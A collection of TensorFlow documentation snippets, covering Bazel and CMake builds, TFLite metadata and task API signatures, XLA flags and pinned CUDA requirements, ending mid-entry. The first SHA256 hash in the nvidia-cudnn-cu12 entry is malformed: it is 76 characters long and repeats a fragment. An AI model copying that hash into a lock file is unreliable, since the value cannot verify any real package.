----------------------------------------

TITLE: Creating Stable Delegate Settings File on Linux Host (Bash)
DESCRIPTION: Creates a JSON configuration file named stable_delegate_settings.json on the Linux host, specifying the path to the sample stable delegate shared library built locally.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_7

LANGUAGE: bash
CODE:
```
echo "{
  \"stable_delegate_loader_settings\": {
    \"delegate_path\": \"$(bazel info -c opt bazel-bin)/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/libtensorflowlite_sample_stable_delegate.so\"
  }
  // Add concrete delegate settings for the test target delegate.
}
"> stable_delegate_settings.json
```

----------------------------------------

TITLE: Building TFLite Benchmark Tool for External Delegate (Shell)
DESCRIPTION: This command builds the standard TFLite benchmark model tool using Bazel. This binary is linked with the `external_delegate_provider`, allowing it to load delegate shared libraries at runtime via command-line flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_6

LANGUAGE: Shell
CODE:
```
bazel build -c opt tensorflow/lite/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Instrumenting Graph with Logging using transform_graph Bash
DESCRIPTION: This snippet demonstrates how to use the TensorFlow `transform_graph` tool via `bazel` to insert logging operations into a quantized graph. It targets `RequantizationRange` ops, prepends their names, and adds a custom message, preparing the graph for collecting min/max ranges.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_8

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=/tmp/quantized_inception.pb \
--out_graph=/tmp/logged_quantized_inception.pb \
--inputs=Mul \
--outputs=softmax \
--transforms='
insert_logging(op=RequantizationRange, show_name=true, message="__requant_min_max:")\
'
```

----------------------------------------

TITLE: Running Instrumented Graph and Logging Output with label_image Bash
DESCRIPTION: This snippet shows how to execute a TensorFlow graph that has been instrumented with logging (using `insert_logging`) via the `label_image` example application. It runs the graph on a specific image and redirects the standard error stream (where `Print` ops write) to a log file for later analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_9

LANGUAGE: bash
CODE:
```
bazel build tensorflow/examples/label_image:label_image
bazel-bin/tensorflow/examples/label_image/label_image \
--image=${HOME}/Downloads/grace_hopper.jpg \
--input_layer=Mul \
--output_layer=softmax \
--graph=/tmp/logged_quantized_inception.pb \
--labels=${HOME}/Downloads/imagenet_comp_graph_label_strings.txt \
2>/tmp/min_max_log_small.txt
```

----------------------------------------

TITLE: Defining Custom Op Build Targets (Bazel)
DESCRIPTION: Configures the Bazel BUILD file to compile the custom TensorFlow op. It defines a `tf_custom_op_library` target to compile the C++ kernel (`sleep_kernel.cc`, `sleep_op.cc`), specifying dependencies like `absl/time`. It then defines a `py_strict_library` target for the Python wrapper (`sleep_op.py`), including the compiled `.so` file as data, and a `py_strict_binary` target for a Python test/example script (`sleep_bin.py`) with its dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_8

LANGUAGE: Bazel
CODE:
```
tf_custom_op_library(
    name = "sleep_kernel.so",
    srcs = [
        "sleep_kernel.cc",
        "sleep_op.cc",
    ],
    deps = [
        "//third_party/absl/time",
    ],
)

py_strict_library(
    name = "sleep_op",
    srcs = ["sleep_op.py"],
    data = ["sleep_kernel.so"],
    srcs_version = "PY3",
)

py_strict_binary(
    name = "sleep_bin",
    srcs = ["sleep_bin.py"],
    srcs_version = "PY3",
    deps = [
        ":sleep_op",
        "//third_party/py/numpy",
        "//third_party/py/tensorflow",
        "@absl_py//absl:app",
    ],
)
```

----------------------------------------

TITLE: Running tfprof in Non-interactive Mode Shell
DESCRIPTION: Illustrates how to execute tfprof directly from the command line in one-shot mode. This command loads a graph definition file (`graph.pbtxt`), sets the display depth (`--max_depth`), and directs the output to a specified file (`/tmp/dump`) instead of entering the interactive shell, useful for scripting or generating reports.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/command_line.md#_snippet_3

LANGUAGE: shell
CODE:
```
# By default output to stdout. Use -output option to change output types.
tfprof scope --graph_path=graph.pbtxt  \
             --max_depth=3 \
             --output="file:outfile=/tmp/dump"
```

----------------------------------------

TITLE: Including Standard CMake Modules
DESCRIPTION: Includes two standard CMake modules: `GNUInstallDirs` for defining standard installation directories and `CMakeDependentOption` for creating options that depend on other variables or options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
include(GNUInstallDirs)
include(CMakeDependentOption)
```

----------------------------------------

TITLE: Add TFLite Objective-C Dependency with Bazel (Python)
DESCRIPTION: Defines an Objective-C library target in a Bazel BUILD file, adding the TensorFlow Lite Objective-C library as a dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_6

LANGUAGE: Python
CODE:
```
objc_library(
  deps = [
      "//tensorflow/lite/objc:TensorFlowLite",
  ],
)
```

----------------------------------------

TITLE: Populating TFLite Source Variables CMake
DESCRIPTION: This series of calls uses the custom CMake function `populate_tflite_source_vars` to populate various TFLite source lists (e.g., `TFLITE_CORE_SRCS`, `TFLITE_CORE_ACCELERATION_SRCS`, `TFLITE_CORE_API_SRCS`) by scanning specified directories and applying optional regex filters to exclude certain files like tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_27

LANGUAGE: CMake
CODE:
```
populate_tflite_source_vars("core" TFLITE_CORE_SRCS)
populate_tflite_source_vars(
  "core/acceleration/configuration" TFLITE_CORE_ACCELERATION_SRCS
  FILTER "xnnpack_plugin.*"
  FILTER "(_test)\\.(cc|h)$"
)
populate_tflite_source_vars("core/api" TFLITE_CORE_API_SRCS)
populate_tflite_source_vars("core/async" TFLITE_CORE_ASYNC_SRCS)
populate_tflite_source_vars("core/async/c" TFLITE_CORE_ASYNC_C_SRCS)
populate_tflite_source_vars("core/async/interop" TFLITE_CORE_ASYNC_INTEROP_SRCS)
populate_tflite_source_vars("core/async/interop/c" TFLITE_CORE_ASYNC_INTEROP_C_SRCS)
populate_tflite_source_vars("core/c" TFLITE_CORE_C_SRCS)
populate_tflite_source_vars("core/experimental/acceleration/configuration" TFLITE_CORE_EXPERIMENTAL_SRCS)
populate_tflite_source_vars("core/kernels" TFLITE_CORE_KERNELS_SRCS)
populate_tflite_source_vars("core/tools" TFLITE_CORE_TOOLS_SRCS)
populate_tflite_source_vars("c" TFLITE_C_SRCS)
populate_tflite_source_vars("delegates" TFLITE_DELEGATES_SRCS)
```

----------------------------------------

TITLE: Checking Python File with pylint Bash
DESCRIPTION: Shows how to run `pylint` on a specific Python file (`myfile.py`) using a custom configuration file (`pylintrc`) located in the TensorFlow repository's build tools directory. This command ensures the Python code adheres to TensorFlow's specific style guidelines. Requires `pylint` to be installed and the command to be run from the top-level TensorFlow directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_4

LANGUAGE: Bash
CODE:
```
pylint --rcfile=tensorflow/tools/ci_build/pylintrc myfile.py
```

----------------------------------------

TITLE: Comparing ImageClassifierOptions Equality TensorFlow Lite Python
DESCRIPTION: Compares the current `ImageClassifierOptions` instance with another object (`other`) for equality. This method allows checking if two different `ImageClassifierOptions` objects have the same configuration settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifierOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Retrieving Unpopulated Metadata JSON (Python)
DESCRIPTION: Retrieves the generated JSON metadata string before it has been populated into the model. This provides access to the initial metadata buffer. Use this if you need the original metadata string before additions like min_parser_version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_5

LANGUAGE: python
CODE:
```
get_metadata_json() -> str\n
```

----------------------------------------

TITLE: Configure Git Sparse Checkout for Object Detection Example - Bash
DESCRIPTION: Navigates into the cloned examples directory and configures Git sparse checkout to only download the files specifically for the Android object detection example app that uses Google Play services. This reduces the amount of data downloaded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_1

LANGUAGE: Bash
CODE:
```
cd examples
git sparse-checkout init --cone
git sparse-checkout set lite/examples/object_detection/android_play_services
```

----------------------------------------

TITLE: Defining nvidia-cuda-cupti-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.82) for the 'nvidia-cuda-cupti-cu12' package and includes multiple SHA256 hashes. This entry ensures that installations of this specific CUDA component are locked to the version 12.5.82 and validated against the provided hash values, preventing unintended upgrades or tampering.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_1

LANGUAGE: Python Requirements
CODE:
```
nvidia-cuda-cupti-cu12==12.5.82 \
    --hash=sha256:4f835281cf492e2bedd153f5c3de9da8f1d775a419468305e64ce73b3b0c6dc3 \
    --hash=sha256:bde77a5feb66752ec61db2adfe47f56b941842825b4c7e2068aff27c9d107953 \
    --hash=sha256:d32c06490c6ba35c4323730820c7d0c4c126c04ed58d2f57275adb8d54b138fe
```

----------------------------------------

TITLE: Creating TFLite MetadataWriter from Flatbuffers Objects (Python)
DESCRIPTION: This class method creates a `MetadataWriter` based on existing metadata provided as Flatbuffers Python objects for the model, input tensors, output tensors, associated files, and processing units. It takes the model buffer and optional metadata objects, returning a `MetadataWriter`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[tflite_support.metadata_schema_py_generated.ModelMetadataT] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Building TensorFlow Pip Package Source with Bazel Bash
DESCRIPTION: Builds the TensorFlow source code required for creating the pip package using Bazel inside the Docker container. This step is configuration-dependent, using different .bazelrc files for CPU/GPU and configurations for remote or local build caches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_4

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
build --config=sigbuild_remote_cache \
tensorflow/tools/pip_package:build_pip_package
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/gpu.bazelrc \
build --config=sigbuild_remote_cache \
tensorflow/tools/pip_package:build_pip_package
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
build --config=sigbuild_local_cache \
tensorflow/tools/pip_package:build_pip_package
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
bazel --bazelrc=/usertools/gpu.bazelrc \
build --config=sigbuild_local_cache \
tensorflow/tools/pip_package:build_pip_package
```

----------------------------------------

TITLE: Build TensorFlow Android Demo Bazel Bash
DESCRIPTION: This Bazel command compiles the TensorFlow Android demo application from source. It specifies `--cxxopt='--std=c++11'` for C++ standard compatibility and `-c opt` for an optimized release build. The target `//tensorflow/tools/android/test:tensorflow_demo` points to the build rule for the demo APK defined in the BUILD file. Successful execution generates the `tensorflow_demo.apk` file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/test/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
bazel build --cxxopt='--std=c++11' -c opt //tensorflow/tools/android/test:tensorflow_demo
```

----------------------------------------

TITLE: Define Export Constants Python
DESCRIPTION: Defines the filename for the exported TFLite model and the directory path where the model and related files will be saved. These constants are referenced later in the export process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
TFLITE_FILENAME = 'browserfft-speech.tflite'
SAVE_PATH = './models'
```

----------------------------------------

TITLE: Build TensorFlowLiteC Static Framework (Bazel/Shell)
DESCRIPTION: Builds the TensorFlow Lite C static framework using Bazel. Similar to the dynamic build, it targets iOS fat binary and optimization, but specifically requests the static framework target. The output is a zip file containing the static framework.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel build --config=ios_fat -c opt --cxxopt=--std=c++17 \
  //tensorflow/lite/ios:TensorFlowLiteC_static_framework
```

----------------------------------------

TITLE: Modify Bazel Macro for Hexagon Delegate Libraries
DESCRIPTION: This line shows how to modify the 'tflite_hexagon_nn_skel_libraries' macro in 'tensorflow/lite/special_rules.bzl'. It specifies the label of the 'filegroup' target containing the Hexagon delegate shared libraries, linking them into the build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_2

LANGUAGE: Bazel BUILD
CODE:
```
return ["//third_party/hexagon_nn_skel:libhexagon_nn_skel"]
```

----------------------------------------

TITLE: Converting TFLite Metadata Buffer to JSON String (Python)
DESCRIPTION: This snippet shows the signature for the `convert_to_json` function, which takes a valid metadata buffer (in bytes) and returns a JSON string representation of the metadata. It is part of the `tflite_support.metadata` module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/convert_to_json.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata.convert_to_json(
    metadata_buffer
)
```

----------------------------------------

TITLE: Calculating Output Shape for SparseTensor (C++)
DESCRIPTION: This C++ code snippet calculates the dense shape of the resulting sparse tensor when performing a conditional operation on multiple sparse tensors. It iterates through each dimension ('rank') and sets the output shape for that dimension to the maximum of the corresponding dimensions from the condition, 'a', and 'b' sparse tensor shapes. This ensures the output shape is large enough to accommodate non-zero elements from any of the inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_4

LANGUAGE: C++
CODE:
```
for (int i = 0; i < rank; ++i) {
  output_shape(i) =
      std::max(cond_shape(i), std::max(a_shape(i), b_shape(i)));
}
```

----------------------------------------

TITLE: Configuring Directory Cache for XLA GPU Autotuning (Shell)
DESCRIPTION: Use this flag to enable and configure a directory-based cache for storing per-fusion autotuning results. XLA will read existing results from the specified directory when needed and write new results determined during compilation. The directory must exist and be writable before the XLA run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/persisted_autotuning.md#_snippet_0

LANGUAGE: Shell
CODE:
```
--xla_gpu_per_fusion_autotune_cache_dir=your/directory
```

----------------------------------------

TITLE: Defining TfLiteOperator Opaque Type (C++)
DESCRIPTION: Declares the `TfLiteOperator` struct as an opaque type. This hides the internal structure of the operator registration object, requiring users to interact with it solely through the provided C API functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_5

LANGUAGE: C++
CODE:
```
typedef struct TfLiteOperator TfLiteOperator;
```

----------------------------------------

TITLE: Use Local TensorFlowLiteObjC Pod (Podfile)
DESCRIPTION: Modifies an iOS project's Podfile to reference the `TensorFlowLiteObjC` pod from a local path instead of a remote CocoaPods repository, enabling development with local changes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_8

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteObjC', :path => '<your_tensorflow_root_dir>'
```

----------------------------------------

TITLE: Defining nvidia-cudnn-cu12 Dependency
DESCRIPTION: Specifies the exact version (9.3.0.75) for the 'nvidia-cudnn-cu12' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the cuDNN library for CUDA 12, critical for deep learning operations, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_4

LANGUAGE: Python Requirements
CODE:
```
nvidia-cudnn-cu12==9.3.0.75 \
    --hash=sha256:9ad9c6929ebb5295eb4a1728024666d1c88283373e265a0c5c883e265a0c5c883e6f9d5cd76d \
    --hash=sha256:c5cf7ff3415e446adf195a5b7dd2ba56cd00c3ee78bfdc566e51698931aa4b7f \
    --hash=sha256:c819e82eed8cf564b9d37478ea4eab9e87194bb3b7f7f8098bc1f67c9b80f1b6
```

----------------------------------------

TITLE: Getting Datafile Path using TensorFlow Lite Support in Python
DESCRIPTION: This function retrieves the path to a data file specified in the build dependencies. It takes a relative path to the data file and returns its absolute path. This is a direct replacement for `tensorflow.python.platform.resource_loader.get_path_to_datafile`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/get_path_to_datafile.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata.get_path_to_datafile(
    path
)
```

----------------------------------------

TITLE: Add Color Space to TFLite Image Metadata Python
DESCRIPTION: This function adds the specified color space value to the image properties being built using the provided FlatBuffer builder. It is likely used within the process of creating metadata for TFLite models, specifically for image inputs/outputs. It requires a FlatBuffer builder instance and the color space value as inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesAddColorSpace.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImagePropertiesAddColorSpace(
    builder, colorSpace
)
```

----------------------------------------

TITLE: Populating Source Files for label_image Example (CMake)
DESCRIPTION: Defines the initial list of source files for the `label_image` executable by populating variables from a source directory (excluding test files) and appending additional files, including utility, profiling, and command-line argument handling code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_0

LANGUAGE: cmake
CODE:
```
populate_source_vars("${TFLITE_SOURCE_DIR}/examples/label_image"
  TFLITE_LABEL_IMAGE_SRCS
  FILTER "_test\\.cc$"
)
list(APPEND TFLITE_LABEL_IMAGE_SRCS
  ${XLA_SOURCE_DIR}/xla/tsl/util/stats_calculator.cc
  ${TFLITE_SOURCE_DIR}/profiling/memory_info.cc
  ${TFLITE_SOURCE_DIR}/profiling/profile_summarizer.cc
  ${TFLITE_SOURCE_DIR}/profiling/profile_summary_formatter.cc
  ${TFLITE_SOURCE_DIR}/profiling/time.cc
  ${TFLITE_SOURCE_DIR}/tools/command_line_flags.cc
  ${TFLITE_SOURCE_DIR}/tools/delegates/default_execution_provider.cc
  ${TFLITE_SOURCE_DIR}/tools/delegates/delegate_provider.cc
  ${TFLITE_SOURCE_DIR}/tools/evaluation/utils.cc
  ${TFLITE_SOURCE_DIR}/tools/tool_params.cc
)
```

----------------------------------------

TITLE: Installing JAX and Orbax Export Libraries
DESCRIPTION: Installs or upgrades the JAX library (version >= 0.4.20) and the Orbax Export library using pip. These are required dependencies for exporting JAX models to TensorFlow's intermediate formats. Requires pip to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/overview.md#_snippet_1

LANGUAGE: Shell
CODE:
```
pip install jax --upgrade
pip install orbax-export --upgrade
```

----------------------------------------

TITLE: Defining save_file function signature in Python
DESCRIPTION: This snippet shows the function signature for the `save_file` utility in `tflite_support`. The function takes the bytes to be saved (`file_bytes`), the target file path (`save_to_path`), and an optional mode string (`mode`, defaulting to 'wb') to specify how the file is opened for writing. It is intended for saving content like metadata-populated TFLite models or associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/save_file.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.writer_utils.save_file(
    file_bytes: Union[bytes, bytearray],
    save_to_path: str,
    mode: str = 'wb'
)
```

----------------------------------------

TITLE: Creating Input TensorAudio TFLite AudioEmbedder Python
DESCRIPTION: Creates an instance of the `TensorAudio` class, which serves as a container for audio data that will be used as input for the `embed` method. Returns a `TensorAudio` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_5

LANGUAGE: python
CODE:
```
create_input_tensor_audio() -> tflite_support.task.audio.TensorAudio
```

----------------------------------------

TITLE: Initializing SegmentationResult in TensorFlow Lite Support Python
DESCRIPTION: Initializes a `SegmentationResult` object. It takes a list of `Segmentation` objects as input, which represent the results of the segmentation task. Although currently expected to contain a single element, the list structure allows for future extensions like instance segmentation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SegmentationResult.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.SegmentationResult(
    segmentations: List[<a href="../../../tflite_support/task/processor/Segmentation"><code>tflite_support.task.processor.Segmentation</code></a>]
)
```

----------------------------------------

TITLE: Using TensorView with TensorFlow Tensor (C++)
DESCRIPTION: Demonstrates how to create a TensorView instance from a TensorFlow tensor and access/modify its elements using various methods like As, Data, operator(), and operator[]. TensorView acts as a non-owning view over the underlying tensor data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
::tensorflow::Tensor tf_tensor;
auto t = TensorView::New(&tf_tensor);

auto t_str_mat = t.As<::tensorflow::tstring, /*RANK=*/ 2>();
t(0, 0) = "ab";
t(0, 1) = "cde"


auto t_buffer = t.Data<::tensorflow::tstring>();
t[0] = "ab";
t[1] = "cde"
```

----------------------------------------

TITLE: Return Statement If Without Else Normalized Output Python
DESCRIPTION: Output code generated by AutoGraph showing the normalization of an `if` statement with a `return` and no `else`. The code following the `if` is moved into a new `else` branch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_38

LANGUAGE: Python
CODE:
```
def f():
  if i > 3:
    return 1
  else:
   i += 1
```

----------------------------------------

TITLE: Check ImageSize Buffer Identifier Python
DESCRIPTION: This class method checks if the byte buffer contains the specific identifier associated with the ImageSize FlatBuffer type. It helps validate if a given buffer is indeed an ImageSize structure before attempting to parse it. The method takes the buffer, offset, and an optional flag indicating if the buffer is size-prefixed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
ImageSizeBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Inspecting Generated Source File for tf.function - TensorFlow AutoGraph - Python
DESCRIPTION: This snippet shows how to find the source file path of the AutoGraph-generated code when using the `@tf.function` decorator. It accesses the original Python function via the `.python_function` attribute of the decorated object before passing it to `tf.autograph.to_graph`. This also outputs the path to a temporary file. Requires `tensorflow` and `inspect`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/generated_code.md#_snippet_1

LANGUAGE: Python
CODE:
```
@tf.function
def f(a):
  ...

converted_f = tf.autograph.to_graph(f.python_function)
print(inspect.getsourcefile(converted_f))
```

----------------------------------------

TITLE: Defining XlaBuilder::Slice operation (C++)
DESCRIPTION: Defines the signature for the XLA Slice operation using the XlaBuilder. This operation extracts a sub-array from the input operand based on the provided starting indices (inclusive), limiting indices (exclusive), and stride values for each dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_34

LANGUAGE: C++
CODE:
```
Slice(operand, start_indices, limit_indices, strides)
```

----------------------------------------

TITLE: Defining String Constant - TensorFlow GraphDef
DESCRIPTION: This node defines a constant tensor holding a string value. The operation type is 'Const', and it is assigned to the CPU device. The string value contains potentially serialized data, possibly related to checkpoint metadata or structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_3

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "Const"
  op: "Const"
  device: "/device:CPU:0"
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "dtype"
    value {
      type: DT_STRING
    }
  }
  attr {
    key: "value"
    value {
      tensor {
        dtype: DT_STRING
        tensor_shape {
        }
        string_val: "\n3\n\005\010\001\022\001v\n\n\010\002\022\006callee\n\n\010\003\022\006caller\n\016\010\004\022\nsignatures*\002\010\001\n>\0228\n\016VARIABLE_VALUE\022\010Variable\032\034v/.ATTRIBUTES/VARIABLE_VALUE*\002\010\001\n\017\n\013\010\005\022\007trace_0*\000\n\017\n\013\010\006\022\007trace_0*\000\n\002*\000\n\002*\000\n\002*\000"
      }
    }
  }
}
```

----------------------------------------

TITLE: Install TensorFlow Lite Support (Python)
DESCRIPTION: Provides the shell command to install the `tflite-support` Python package using pip. This package contains the necessary TextSearcher API and is a prerequisite for using the Python code examples.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_searcher.md#_snippet_3

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Installing Required Libraries (Python)
DESCRIPTION: Installs the necessary Python libraries: `matplotlib` for plotting, `tensorflow` for core ML operations, and `tensorflow-hub` for loading the pre-trained model. These are required dependencies for the rest of the process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
!pip install matplotlib tensorflow tensorflow-hub
```

----------------------------------------

TITLE: Installing Required Packages (Shell)
DESCRIPTION: Installs necessary system libraries (`libportaudio2`) and the `tflite-model-maker-nightly` Python package using shell commands. This prepares the environment, typically a notebook like Colab, with the required dependencies for the Model Maker library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_2

LANGUAGE: shell
CODE:
```
!sudo apt -y install libportaudio2
!pip install -q tflite-model-maker-nightly
```

----------------------------------------

TITLE: Load Test Image Python
DESCRIPTION: This Python snippet imports PIL, JAX, and requests to fetch and display a test image from a URL. The image is loaded using `requests` and `PIL.Image`, then displayed, serving as the input for subsequent model inference steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
from PIL import Image
import jax
import requests

url = "https://storage.googleapis.com/download.tensorflow.org/example_images/astrid_l_shaped.jpg"
image = Image.open(requests.get(url, stream=True).raw)
image
```

----------------------------------------

TITLE: Accessing Author Information in ModelMetadata
DESCRIPTION: Retrieves the author information string stored in the model metadata. This method returns the name or identifier of the model's author.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_3

LANGUAGE: python
CODE:
```
Author()
```

----------------------------------------

TITLE: Checking if Output Tensor Metadata is None in TensorFlow Lite Metadata (Python)
DESCRIPTION: Checks if the optional OutputTensorMetadata field in the TensorFlow Lite model metadata structure is null or absent. Returns a boolean value indicating its presence.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_28

LANGUAGE: python
CODE:
```
OutputTensorMetadataIsNone()
```

----------------------------------------

TITLE: Setting Bazel Test Flags for GPU (v2.18+) - Bash
DESCRIPTION: Sets the `flags` environment variable for running Bazel tests on a GPU for TensorFlow versions 2.18 and later. It includes `--config=linux`, `--config=cuda` to enable CUDA, and `-k` to keep running after failures. This variable is used in subsequent `bazel test` commands.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_8

LANGUAGE: bash
CODE:
```
export flags="--config=linux --config=cuda -k"
```

----------------------------------------

TITLE: Initializing ScoreCalibrationOptionsT class (Python)
DESCRIPTION: Constructs a new instance of the `ScoreCalibrationOptionsT` class. This class represents options for score calibration within TFLite metadata. It has no explicit parameters upon instantiation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreCalibrationOptionsT()
```

----------------------------------------

TITLE: Start Subgraph Metadata Definition Python
DESCRIPTION: Initiates the process of defining metadata for a specific subgraph within the TFLite model's FlatBuffers metadata schema. It requires a `FlatBuffers builder` object as input, which is used to construct and serialize the metadata structure. This function must be called before adding any subgraph-specific metadata fields.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStart(
    builder
)
```

----------------------------------------

TITLE: Installing Specific JAX Nightly Python
